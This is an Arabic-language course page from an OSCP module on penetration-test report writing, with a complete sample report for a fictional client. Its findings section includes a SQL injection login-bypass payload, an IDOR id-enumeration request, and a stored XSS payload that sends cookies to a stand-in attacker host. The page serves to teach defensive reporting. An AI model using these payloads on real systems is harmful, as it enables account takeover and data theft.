+<p>أبعد من الإصلاحات الفورية، الفرق التقنية كمان بتستفيد من إرشاد موجَّه للتحسين طويل المدى — تغييرات معمارية، أفضل ممارسات الإعداد، تحسينات إدارة الـ patches، أو استراتيجيات تطوير آمن.</p>
+<h3>الملخّص التنفيذي (Executive Summary)</h3>
+<p>التقرير المفروض يبدأ بـ <strong>Executive Summary</strong>. القسم ده بيسمح لأصحاب المصلحة الكبار يفهموا بسرعة أهداف، تغطية، ونتائج التقييم عشان يقدروا يقيّموا قيمته التجارية ويعتمدوا إجراءات تصحيحية. المفروض يبدأ بنقاط موجزة عالية التأثير بتقدّم الصورة الكاملة، متبوعة بسرد تفصيلي أوسع.</p>
+<p><strong>العناصر الأساسية اللي الـ Executive Summary لازم توثّقها:</strong></p>
+<ol>
+<li><strong>النطاق (Scope)</strong> – نطاق متفق عليه رسميًا بيرسّخ حدود الاختبار ويوضّح إيه الأنظمة، التطبيقات، أو البيئات اللي اتضمّنت. لازم يُذكر بوضوح إيه اللي اتقيّم وهل أي مكونات اتستبعدت أو اتشالت أثناء المهمة</li>
+<li><strong>الجدول الزمني للاختبار</strong> – مدة المهمة، التواريخ المحددة، ولو منطبق، نافذة الاختبار اليومية</li>
+<li><strong>Rules of Engagement</strong> – الإشارة لها، بما فيها أي دور إشراف، الأنشطة المسموحة أو المقيَّدة، وأي إطار أو معيار استُخدم (OWASP، PCI DSS...إلخ)</li>
+<li><strong>البنية التحتية الداعمة واستخدام الحسابات</strong> – هل اتوفّرت اعتمادات اختبار أو كان التقييم black-box خارجي؛ عناوين IP المصدر المستخدَمة؛ أي حسابات اتعملت من فريق الاختبار</li>
+</ol>
+<h3>مثال بنية — تفاصيل تنفيذية عالية المستوى</h3>
+<div class="code-wrap"><pre><code>Executive Summary (Key Facts Section):
+
+Scope: https://example.com/login
+Testing Period: January 3–5, 2022
+Methodology: OWASP / PCI-aligned testing approach
+Social engineering and DoS testing excluded
+No test credentials provided (external black-box assessment)
+All activity originated from 192.168.1.2
+</code></pre></div>
+<p>بعد تقديم التفاصيل الموجزة دي، التقرير المفروض ينتقل للسرد الموسَّع للـ Executive Summary. القسم ده بيوفّر نظرة استراتيجية عامة على المهمة، بيلخّص أهم النتائج، وبيوصّل التعرّض الكلي للمخاطر.</p>
+<blockquote>
+<p><strong>لازم الحرص على عدم المبالغة أو التقليل من النتائج.</strong> الهدف تقديم تمثيل واقعي لوضع المؤسسة الأمني. مثلًا، ثغرة SQL injection بتعرّض بيانات بطاقات دفع ليها تأثير تجاري مختلف تمامًا عن تجاوز توثيق يأثر على معلومات عامة متاحة.</p>
+</blockquote>
+<h3>الأنماط الملحوظة (Observed Patterns)</h3>
+<p>التنفيذيين مش محتاجين شروحات تقنية مفصَّلة في القسم ده — دي هتظهر لاحقًا في التقرير. لكن تلخيص نقاط الضعف المتكررة يقدر يوفّر رؤية استراتيجية قيّمة.</p>
+<p><strong>لتحديد الاتجاهات، الثغرات لازم تتجمّع حسب الفئة.</strong> نتائج متعددة في نفس الفئة غالبًا بتشير لنقاط ضعف منهجية. مثلًا، وجود stored وreflected XSS، SQL injection، وثغرات رفع ملفات غير مقيَّد مع بعض ممكن يشير بشكل جماعي لممارسات تحقق مدخل غير كافية عبر التطبيق. المشاكل المنهجية دي محتاجة علاج على مستوى العملية مش إصلاحات معزولة — في السياق ده، التوصية بتدريب تطوير آمن أو معايير برمجة محسَّنة مناسبة.</p>
+<h3>الاعتراف بنقاط القوة</h3>
+<p>مهم بنفس القدر إننا نعترف بالمناطق اللي العميل أظهر فيها ممارسات أمان قوية. رغم إن الإدارة ممكن ترعى المهمة، التعاون عادةً بيحصل مع الفرق التقنية. الاعتراف بضوابط فعّالة — زي سياسات باسورد قوية، آليات قفل الحساب، أو إعدادات مقوّاة — بيساعد يحافظ على علاقات بنّاءة ويعزّز سلوكيات أمان إيجابية.</p>
+<blockquote>
+<p><strong>الحذر في اللغة:</strong> تجنّب عبارات مطلقة زي "كان مستحيل استغلاله." المهام بتشتغل جوه حدود وقت وموارد، والاستنتاجات المفروض تعكس إن الاختبار ما حددش نقطة ضعف، مش ادّعاء غياب قطعي.</p>
+</blockquote>
+<h3>مناقشة النتائج الأساسية</h3>
+<p>بعد الاعتراف بنقاط القوة، الـ Executive Summary المفروض تقدّم مناقشة متوازنة للثغرات الأساسية. مثلًا، لو التقييم كشف XSS مدمج مع تعداد أسماء مستخدمين (username enumeration)، السرد ممكن يشرح إزاي التحقق الناقص من المدخل ومعالجة أخطاء مُفصَّلة بتزود احتمالية سرقة اعتمادات أو اختطاف جلسة.</p>
+<p>التوصيات المفروض تركّز على إجراءات تصحيحية أوسع، زي تنفيذ تحقق مدخل مركزي وتوحيد رسائل خطأ عامة.</p>
+<p>الـ Executive Summary المفروض تختم ببيان ختامي موجز بيوجّه القراء للأقسام التقنية التفصيلية اللي جاية.</p>
+<h3>اعتبارات بيئة الاختبار (Testing Environment Considerations)</h3>
+<p>القسم الأول من التقرير الكامل المفروض يغطّي أي عوامل أثّرت على عملية الاختبار. القسم ده عادةً قصير لكن مهم للشفافية. أخطاء، تأخيرات، أو ظروف مخفّفة تانية المفروض تتوثّق عشان العميل يفهم أي قيود، وعشان المهام المستقبلية تتحسّن.</p>
+<p>مش كل المشاكل الصغيرة محتاجة إبراز، لكن التقرير الاحترافي بيتطلب الإفصاح عن الظروف اللي ممكن تأثر على النتائج.</p>
+<h3>الملاحق، معلومات إضافية، والمراجع</h3>
+<p><strong>الملاحق (Appendices)</strong> للمواد المفصَّلة أو الطويلة زيادة عن المناسب للتقرير الرئيسي، بما فيها:</p>
+<ol>
+<li>قوائم كاملة للمستخدمين المخترَقين أو النقاط النهائية المتأثرة</li>
+<li>كتل كود PoC كبيرة</li>
+<li>منهجية مفصَّلة أو مستندات تقنية موسَّعة</li>
+</ol>
+<p><strong>قسم المعلومات الإضافية (Further Information)</strong> ممكن يشمل:</p>
+<ol>
+<li>مقالات أو مراجع بتشرح الثغرات بعمق</li>
+<li>معايير أو أفضل ممارسات ذات صلة بالعلاج</li>
+<li>طرق استغلال بديلة (لو مفيدة)</li>
+</ol>
+<p><strong>قسم المراجع (References)</strong> المفروض يستخدم مصادر موثوقة واستشهادات سليمة لتوفير مصداقية وسياق إضافي.</p>
+<hr />
+<h2 id="lu3"><span class="num">03</span><span class="htext">نموذج تطبيقي: تقرير اختبار اختراق كامل (Full Sample Pentest Report)</span></h2>
+<blockquote>
+<p>القسم ده مثال تطبيقي كامل بيجسّد كل المبادئ اللي اتغطّت في LU1 وLU2 — بنية التقرير، الـ Executive Summary، تخصيص المحتوى حسب الجمهور، وتوثيق النتائج التقنية بالصيغة الصحيحة. السيناريو افتراضي بالكامل (ExampleCorp)، لكن مبني بنفس التفاصيل اللي اتعرضت كمثال في LU2 (النطاق، الفترة الزمنية، والـ IP المصدر).</p>
+</blockquote>
+<hr />
+<h3>صفحة الغلاف وضبط المستند (Document Control)</h3>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>الحقل</th>
+<th>القيمة</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>اسم العميل</strong></td>
+<td>ExampleCorp Inc.</td>
+</tr>
+<tr>
+<td><strong>عنوان المهمة</strong></td>
+<td>Web Application Penetration Test — Customer Portal</td>
+</tr>
+<tr>
+<td><strong>النطاق</strong></td>
+<td><code>https://example.com/login</code> وما تحته من مسارات مصادَق عليها</td>
+</tr>
+<tr>
+<td><strong>فترة الاختبار</strong></td>
+<td>3–5 يناير 2022</td>
+</tr>
+<tr>
+<td><strong>المنهجية</strong></td>
+<td>OWASP Testing Guide (WSTG) مع مواءمة لمتطلبات PCI DSS</td>
+</tr>
+<tr>
+<td><strong>نوع الاختبار</strong></td>
+<td>Black-box خارجي — من غير بيانات اعتماد اختبار مُقدَّمة مسبقًا</td>
+</tr>
+<tr>
+<td><strong>الـ IP المصدر</strong></td>
+<td><code>192.168.1.2</code> (كل النشاط صدر من العنوان ده)</td>
+</tr>
+<tr>
+<td><strong>إعداد التقرير</strong></td>
+<td>فريق تقييم الأمان الهجومي</td>
+</tr>
+<tr>
+<td><strong>التصنيف</strong></td>
+<td>سري — للتوزيع الداخلي والعميل فقط</td>
+</tr>
+<tr>
+<td><strong>الإصدار</strong></td>
+<td>v1.0 — نهائي</td>
+</tr>
+</tbody>
+</table></div>
+<p><strong>الاستثناءات المتفق عليها في RoE:</strong> اختبارات الـ Social Engineering وDenial-of-Service مستبعَدة صراحةً من نطاق المهمة دي.</p>
+<hr />
+<h3>الملخّص التنفيذي (Executive Summary)</h3>
+<p><strong>نقاط أساسية (Key Facts):</strong></p>
+<div class="code-wrap"><pre><code>Scope: https://example.com/login (+ authenticated application paths)
+Testing Period: January 3–5, 2022
+Methodology: OWASP / PCI-aligned testing approach
+Social engineering and DoS testing excluded
+No test credentials provided (external black-box assessment)
+All activity originated from 192.168.1.2
+</code></pre></div>
+<p><strong>السرد التنفيذي:</strong></p>
+<p>خلال فترة الاختبار، حدد فريق التقييم <strong>7 نتائج</strong>، منها نتيجتين بخطورة <strong>عالية (High)</strong> وواحدة <strong>حرجة (Critical)</strong>. الثغرة الحرجة — SQL Injection في نموذج تسجيل الدخول — بتسمح لمهاجم غير موثّق بتجاوز المصادقة بالكامل والوصول المباشر لقاعدة بيانات العملاء، بما فيها بيانات شخصية وتفاصيل فواتير. النتيجة دي تمثّل أعلى أولوية للعلاج الفوري.</p>
+<p>بالإضافة لكده، تحديد ثغرة <strong>Stored XSS</strong> في حقل الاسم المعروض بالملف الشخصي وثغرة <strong>IDOR</strong> في نقطة تحميل الفواتير بيوضّحوا نمط متكرر: <strong>عدم كفاية التحقق من المدخلات والتفويض على مستوى الكائن (object-level authorization)</strong> عبر طبقات التطبيق المختلفة. النمط ده بيشير لمشكلة منهجية في دورة تطوير التطبيق أكتر من كونها أخطاء معزولة، وبيستدعي مراجعة لممارسات البرمجة الآمنة بدل إصلاحات نقطية فقط.</p>
+<p>من الجانب الإيجابي، فريق التقييم لاحظ تطبيق <strong>سياسة باسورد قوية نسبيًا</strong> وتفعيل <strong>قفل الحساب بعد محاولات فاشلة متكررة</strong> على مستوى منفصل من endpoint تسجيل الدخول الرئيسي — دليل على اهتمام قائم بالتحكم في الوصول رغم الثغرات المكتشَفة.</p>
+<p>التقرير التفصيلي التالي بيوثّق كل نتيجة بدليلها التقني الكامل وتوصيات العلاج المرتبطة بيها.</p>
+<hr />
+<h3>اعتبارات بيئة الاختبار (Testing Environment Considerations)</h3>
+<p>تم تمديد نافذة الاختبار بيوم واحد إضافي (من يومين لثلاثة) بالاتفاق مع العميل، بسبب اكتشاف عدد من النتائج المحتملة ذات الأولوية العالية احتاجت وقت تحقق إضافي لتأكيد الاستغلال وتوثيقه بدقة. التأخير اتفق عليه رسميًا مع نقطة الاتصال التقنية للعميل ومفيش تأثير على باقي النطاق.</p>
+<hr />
+<h3>ملخّص النتائج (Findings Summary)</h3>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>#</th>
+<th>العنوان</th>
+<th>الخطورة</th>
+<th>المكوّن المتأثر</th>
+<th>CWE</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>F1</td>
+<td>SQL Injection في نموذج تسجيل الدخول</td>
+<td><strong>Critical</strong></td>
+<td><code>/login</code></td>
+<td>CWE-89</td>
+</tr>
+<tr>
+<td>F2</td>
+<td>Stored XSS في حقل الاسم المعروض</td>
+<td><strong>High</strong></td>
+<td><code>/profile/update</code></td>
+<td>CWE-79</td>
+</tr>
+<tr>
+<td>F3</td>
+<td>IDOR في نقطة تحميل الفواتير</td>
+<td><strong>High</strong></td>
+<td><code>/invoices/download?id=</code></td>
+<td>CWE-639</td>
+</tr>
+<tr>
+<td>F4</td>
+<td>غياب Rate Limiting على تسجيل الدخول</td>
+<td><strong>Medium</strong></td>
+<td><code>/login</code></td>
+<td>CWE-307</td>
+</tr>
+<tr>
+<td>F5</td>
+<td>إعداد TLS ضعيف (دعم TLS 1.0)</td>
+<td><strong>Medium</strong></td>
+<td>البنية التحتية — كل النطاق</td>
+<td>CWE-326</td>
+</tr>
+<tr>
+<td>F6</td>
+<td>كشف معلومات عبر رسائل خطأ مُفصَّلة</td>
+<td><strong>Low</strong></td>
+<td><code>/api/v1/orders</code></td>
+<td>CWE-209</td>
+</tr>
+<tr>
+<td>F7</td>
+<td>غياب رؤوس أمان HTTP أساسية</td>
+<td><strong>Informational</strong></td>
+<td>كل النطاق</td>
+<td>CWE-693</td>
+</tr>
+</tbody>
+</table></div>
+<h3>مصفوفة المخاطر (Risk = Likelihood × Impact)</h3>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th></th>
+<th>Impact: منخفض</th>
+<th>Impact: متوسط</th>
+<th>Impact: عالي</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Likelihood: عالية</strong></td>
+<td>F4 (متوسط)</td>
+<td>F5 (متوسط)</td>
+<td><strong>F1 (حرج)</strong></td>
+</tr>
+<tr>
+<td><strong>Likelihood: متوسطة</strong></td>
+<td>F6 (منخفض)</td>
+<td>—</td>
+<td><strong>F2، F3 (عالي)</strong></td>
+</tr>
+<tr>
+<td><strong>Likelihood: منخفضة</strong></td>
+<td>F7 (معلوماتي)</td>
+<td>—</td>
+<td>—</td>
+</tr>
+</tbody>
+</table></div>
+<hr />
+<h3>النتائج التقنية التفصيلية (Technical Findings)</h3>
+<h4>F1 — SQL Injection في نموذج تسجيل الدخول</h4>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>الحقل</th>
+<th>القيمة</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Severity</strong></td>
+<td>Critical (CVSS 9.8)</td>
+</tr>
+<tr>
+<td><strong>Component</strong></td>
+<td><code>POST /login</code></td>
+</tr>
+<tr>
+<td><strong>HTTP Method</strong></td>
+<td>POST</td>
+</tr>
+<tr>
+<td><strong>Affected Parameter</strong></td>
+<td><code>username</code></td>
+</tr>
+</tbody>
+</table></div>
+<p><strong>الوصف:</strong> حقل <code>username</code> في نموذج تسجيل الدخول بيتمرّر مباشرة لاستعلام SQL من غير parameterization أو تنقية. ده بيسمح لمهاجم غير موثّق يتجاوز المصادقة بالكامل.</p>
+<p><strong>PoC Payload:</strong></p>
+<div class="code-wrap"><pre><code class="language-http">POST /login HTTP/1.1
+Host: example.com
+Content-Type: application/x-www-form-urlencoded
+
+username=admin'-- -&amp;password=anything
+</code></pre></div>
+<p><strong>النتيجة:</strong> الاستعلام الخلفي بيتحول فعليًا لـ:</p>
+<div class="code-wrap"><pre><code class="language-sql">SELECT * FROM users WHERE username = 'admin'-- -' AND password = 'anything'
+</code></pre></div>
+<p>الجزء بعد <code>--</code> بيتحوّل لتعليق، وده بيلغي فحص الباسورد تمامًا — السيرفر رجّع كود <code>302 Found</code> وجلسة مصادَقة صالحة لحساب <code>admin</code> من غير ما الباسورد الصحيح يتطلب.</p>
+<p><strong>الأثر (Impact):</strong> تجاوز مصادقة كامل، وصول مباشر لجدول المستخدمين، احتمالية استخراج بيانات العملاء بالكامل عبر تقنيات Blind/Union-based SQLi إضافية.</p>
+<p><strong>التوصية:</strong> استخدام <strong>parameterized queries / prepared statements</strong> بشكل حصري لكل تفاعل مع قاعدة البيانات. تفعيل WAF كطبقة دفاع إضافية (مش بديل عن الإصلاح الجذري). إجراء مراجعة كود شاملة لكل نقاط الإدخال المشابهة في التطبيق.</p>
+<hr />
+<h4>F2 — Stored XSS في حقل الاسم المعروض بالملف الشخصي</h4>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>الحقل</th>
+<th>القيمة</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Severity</strong></td>
+<td>High (CVSS 8.1)</td>
+</tr>
+<tr>
+<td><strong>Component</strong></td>
+<td><code>POST /profile/update</code></td>
+</tr>
+<tr>
+<td><strong>Affected Parameter</strong></td>
+<td><code>display_name</code></td>
+</tr>
+</tbody>
+</table></div>
+<p><strong>الوصف:</strong> حقل <code>display_name</code> بيتخزّن ويتعرض لاحقًا في لوحة التحكم ولصفحات العملاء التانيين (مثل قوائم الفريق) من غير تنقية أو encoding عند العرض.</p>
+<p><strong>PoC Payload:</strong></p>
+<div class="code-wrap"><pre><code class="language-html">&lt;script&gt;fetch('https://attacker-server.example/c?c='+document.cookie)&lt;/script&gt;
+</code></pre></div>
+<p><strong>خطوات إعادة الإنتاج:</strong>
+1. سجّل دخول كمستخدم عادي، روح لـ <code>/profile/update</code>
+2. حدّث <code>display_name</code> بالـ payload أعلاه
+3. أي مستخدم تاني (بما فيهم admins) بيشوف صفحة فيها الاسم ده → السكربت بيتنفّذ في سياق متصفحهم</p>
+<p><strong>الأثر:</strong> سرقة كوكيز الجلسة، اختطاف حسابات مستخدمين آخرين (بما فيهم مستخدمين إداريين لو شافوا الصفحة المتأثرة)، تنفيذ أفعال نيابة عن الضحية.</p>
+<p><strong>التوصية:</strong> تطبيق <strong>output encoding</strong> مناسب للسياق (HTML entity encoding) في كل نقاط العرض. تفعيل <strong>Content-Security-Policy</strong> صارمة كطبقة دفاع ثانية. التحقق من المدخل من ناحية الطول والأحرف المسموحة.</p>
+<hr />
+<h4>F3 — IDOR في نقطة تحميل الفواتير</h4>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>الحقل</th>
+<th>القيمة</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Severity</strong></td>
+<td>High (CVSS 7.5)</td>
+</tr>
+<tr>
+<td><strong>Component</strong></td>
+<td><code>GET /invoices/download?id=</code></td>
+</tr>
+<tr>
+<td><strong>Affected Parameter</strong></td>
+<td><code>id</code></td>
+</tr>
+</tbody>
+</table></div>
+<p><strong>الوصف:</strong> نقطة تحميل الفواتير بتسترجع المستند بناءً على <code>id</code> رقمي تسلسلي من غير التحقق من إن المستخدم الحالي فعلًا يملك الفاتورة دي.</p>
+<p><strong>PoC:</strong></p>
+<div class="code-wrap"><pre><code class="language-http">GET /invoices/download?id=1042 HTTP/1.1
+Host: example.com
+Cookie: session=&lt;attacker_valid_session&gt;
+</code></pre></div>
+<p>بتغيير قيمة <code>id</code> تدريجيًا (1041، 1043، 1044...)، المختبر قدر يحمّل فواتير تخص حسابات عملاء تانيين تمامًا — شاملة أسماء، عناوين، وتفاصيل دفع جزئية.</p>
+<p><strong>الأثر:</strong> تسريب بيانات حساسة لعملاء آخرين، انتهاك مباشر لمتطلبات PCI DSS الخاصة بحماية بيانات حامل البطاقة.</p>
+<p><strong>التوصية:</strong> فرض فحص تفويض على مستوى الكائن (object-level authorization check) في السيرفر لكل طلب — التأكد إن <code>invoice.owner_id == current_user.id</code> قبل تسليم أي مستند. استبدال المعرّفات التسلسلية بـ UUIDs غير قابلة للتخمين كطبقة دفاع إضافية.</p>
+<hr />
+<h4>F4 — غياب Rate Limiting على نقطة تسجيل الدخول</h4>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>الحقل</th>
+<th>القيمة</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Severity</strong></td>
+<td>Medium (CVSS 5.3)</td>
+</tr>
+<tr>
+<td><strong>Component</strong></td>
+<td><code>POST /login</code></td>
+</tr>
+</tbody>
+</table></div>
+<p><strong>الوصف:</strong> نقطة تسجيل الدخول بتقبل عدد غير محدود من المحاولات المتتالية من غير أي حد زمني أو CAPTCHA، رغم وجود قفل حساب بعد محاولات فاشلة (ملاحظة إيجابية منفصلة — راجع السرد التنفيذي).</p>
+<p><strong>الدليل:</strong> إرسال 500 طلب تسجيل دخول متتالي من نفس الـ IP خلال دقيقتين — كل الطلبات اتقبلت واتعالجت من غير حظر أو تأخير ملحوظ.</p>
+<p><strong>الأثر:</strong> يسهّل هجمات credential stuffing وbrute-force ضد حسابات مش محمية بقفل الحساب، أو ضد آلية القفل نفسها عبر توزيع المحاولات على حسابات متعددة.</p>
+<p><strong>التوصية:</strong> فرض rate limiting على مستوى الـ IP وmستوى الحساب (مثلًا: 5 محاولات لكل 15 دقيقة)، مع تطبيق تأخير تصاعدي (exponential backoff) وCAPTCHA بعد عتبة معينة.</p>
+<hr />
+<h4>F5 — إعداد TLS ضعيف (دعم بروتوكولات قديمة)</h4>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>الحقل</th>
+<th>القيمة</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Severity</strong></td>
+<td>Medium (CVSS 4.8)</td>
+</tr>
+<tr>
+<td><strong>Component</strong></td>
+<td>كل النطاق — طبقة النقل</td>
+</tr>
+</tbody>
+</table></div>
+<p><strong>الوصف:</strong> السيرفر لسه بيقبل اتصالات بـ <strong>TLS 1.0</strong> و<strong>TLS 1.1</strong>، البروتوكولين دول معروفين بضعفهم وتم التوصية رسميًا بإيقافهم (deprecated) من قِبل IETF منذ 2021.</p>
+<p><strong>الدليل:</strong></p>
+<div class="code-wrap"><pre><code>$ nmap --script ssl-enum-ciphers -p 443 example.com
+TLSv1.0: supported (weak)
+TLSv1.1: supported (weak)
+TLSv1.2: supported
+TLSv1.3: supported
+</code></pre></div>
+<p><strong>الأثر:</strong> عرضة لهجمات downgrade وثغرات معروفة زي BEAST وPOODLE في بيئات معينة، وانتهاك محتمل لمتطلبات PCI DSS اللي بتفرض تعطيل TLS أقل من 1.2.</p>
+<p><strong>التوصية:</strong> تعطيل TLS 1.0 و1.1 بالكامل على مستوى إعدادات السيرفر/load balancer، والإبقاء على TLS 1.2 و1.3 فقط.</p>
+<hr />
+<h4>F6 — كشف معلومات عبر رسائل خطأ مُفصَّلة</h4>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>الحقل</th>
+<th>القيمة</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Severity</strong></td>
+<td>Low (CVSS 3.1)</td>
+</tr>
+<tr>
+<td><strong>Component</strong></td>
+<td><code>GET /api/v1/orders</code></td>
+</tr>
+</tbody>
+</table></div>
+<p><strong>الوصف:</strong> إرسال معرّف طلب غير صالح أو غير موجود بيرجّع stack trace كامل بيكشف مسار الملفات الداخلي، إصدار الـ framework، وبنية قاعدة البيانات.</p>
+<p><strong>الدليل:</strong></p>
+<div class="code-wrap"><pre><code class="language-http">GET /api/v1/orders/999999999 HTTP/1.1
+Host: example.com
+
+HTTP/1.1 500 Internal Server Error
+{
+  &quot;error&quot;: &quot;ORA-00942: table or view does not exist&quot;,
+  &quot;trace&quot;: &quot;at com.examplecorp.orders.OrderService.fetch(OrderService.java:142)...&quot;,
+  &quot;path&quot;: &quot;/var/www/app/src/main/java/...&quot;
+}
+</code></pre></div>
+<p><strong>الأثر:</strong> المعلومات دي بتساعد مهاجم يرسم خريطة البنية التحتية الداخلية ويحدد تقنيات مستهدَفة لهجمات لاحقة أدق.</p>
+<p><strong>التوصية:</strong> تفعيل معالجة أخطاء عامة (generic error handling) في بيئة الإنتاج — رسائل خطأ عامة للمستخدم، مع تسجيل التفاصيل الكاملة داخليًا فقط عبر نظام الـ logging.</p>
+<hr />
+<h4>F7 — غياب رؤوس أمان HTTP أساسية</h4>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>الحقل</th>
+<th>القيمة</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Severity</strong></td>
+<td>Informational</td>
+</tr>
+<tr>
+<td><strong>Component</strong></td>
+<td>كل النطاق</td>
+</tr>
+</tbody>
+</table></div>
+<p><strong>الوصف:</strong> النطاق بيفتقر لرؤوس أمان موصى بيها معياريًا: <code>Content-Security-Policy</code>، <code>X-Frame-Options</code>، <code>Strict-Transport-Security</code>، و<code>X-Content-Type-Options</code>.</p>
+<p><strong>الأثر:</strong> بيزود سطح الهجوم لثغرات تانية (زي clickjacking عند غياب X-Frame-Options، أو تضخيم أثر XSS عند غياب CSP)، رغم إنها مش ثغرة مستقلة بذاتها.</p>
+<p><strong>التوصية:</strong> إضافة الرؤوس دي على مستوى السيرفر أو الـ reverse proxy كخطوة منخفضة التكلفة وعالية القيمة الدفاعية.</p>
+<hr />
+<h3>الملاحق (Appendices)</h3>
+<p><strong>ملحق أ — قائمة كاملة بنقاط النهاية (Endpoints) اللي تمت مراجعتها:</strong></p>
+<div class="code-wrap"><pre><code>/login
+/register
+/profile/update
+/invoices/download
+/api/v1/orders
+/api/v1/users/me
+/dashboard
+/settings/security
+</code></pre></div>
+<p><strong>ملحق ب — الأدوات المستخدَمة أثناء التقييم:</strong></p>
+<p>Burp Suite Professional (اعتراض وتعديل الطلبات) | sqlmap (التحقق من SQL Injection) | nmap + ssl-enum-ciphers (فحص إعدادات TLS) | OWASP ZAP (فحص آلي تكميلي) | أدوات مخصَّصة (سكربتات Python لاختبار IDOR بشكل منهجي عبر نطاق الـ IDs)</p>
+<p><strong>ملحق ج — مراجع:</strong></p>
+<ul>
+<li>OWASP Top 10 (2021) — <a href="https://owasp.org">owasp.org/Top10</a></li>
+<li>OWASP Testing Guide (WSTG)</li>
+<li>CWE-89: SQL Injection — <a href="https://cwe.mitre.org">cwe.mitre.org/data/definitions/89.html</a></li>
+<li>PCI DSS v4.0 Requirement 4 (التشفير أثناء النقل)</li>
+</ul>
+<hr />
+<blockquote>
+<p><strong>ملاحظة ختامية:</strong> التقرير ده مثال تدريبي بالكامل — الأسماء، النطاقات، وبيانات الاعتماد كلها وهمية ومُستخدَمة لأغراض تعليمية فقط. الصيغة والبنية بس هي اللي المفروض تاخدها كمرجع لتقاريرك الحقيقية.</p>
+</blockquote>
+<hr />
+<p><em>نهاية نوتس الموديول الثالث — OSCP: Report Writing for Penetration Testers</em></p>
+  <div class="footer-note">-- EOF: module-03/report-writing-for-pentesters.md --</div>
+
+</div>
+</body>
+</html>
